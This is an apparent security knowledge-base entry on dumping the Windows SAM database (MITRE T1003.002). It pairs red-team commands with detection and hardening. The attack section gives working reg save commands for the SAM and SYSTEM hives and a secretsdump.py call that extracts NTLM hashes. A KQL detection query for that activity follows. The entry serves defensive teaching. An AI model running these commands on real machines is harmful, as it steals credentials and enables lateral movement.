# [CA-DUMP-005]: SAM Database Extraction

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-DUMP-005 |
| **MITRE ATT&CK v18.1** | [OS Credential Dumping: Security Account Manager (T1003.002)](https://attack.mitre.org/techniques/T1003/002/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows Endpoint |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** The Security Account Manager (SAM) database stores local user account passwords (as NTLM hashes). Attackers dump this file to obtain the local Administrator hash.
- **Attack Surface:** `HKLM\SAM` Registry Hive and the file `C:\Windows\System32\config\SAM`.
- **Business Impact:** **Local Persistence**. If the local Administrator password is reused across the fleet (lack of LAPS), this leads to massive lateral movement.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Administrator or SYSTEM.
- **Vulnerable Config:** Disabled LAPS (Local Administrator Password Solution).
- **Tools:**
    - `reg.exe`
    - [Impacket](https://github.com/fortra/impacket)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Backup Hives**
```cmd
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
```

**Step 2: Extraction**
```bash
# Offline using Impacket
secretsdump.py -sam sam.save -system system.save LOCAL
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4663 | Object Name = `\Device\HarddiskVolume...\Windows\System32\config\SAM` |
| **Sysmon** | 1 | Process `reg.exe` accessing SAM hive. |

#### 5.2 Sentinel (KQL)
```kusto
ProcessCreationEvents
| where ProcessCommandLine has "reg" and ProcessCommandLine has "save"
| where ProcessCommandLine has "SAM"
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **LAPS:** Deploy **Windows LAPS** to randomize local admin passwords daily/weekly.
*   **Restricted Admin:** Disable the built-in Administrator account and create a new local admin with a unique name, managed by LAPS.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-VALID-001]
> **Next Logical Step:** [LAT-AD-001] (Pass-the-Hash with Local Admin)
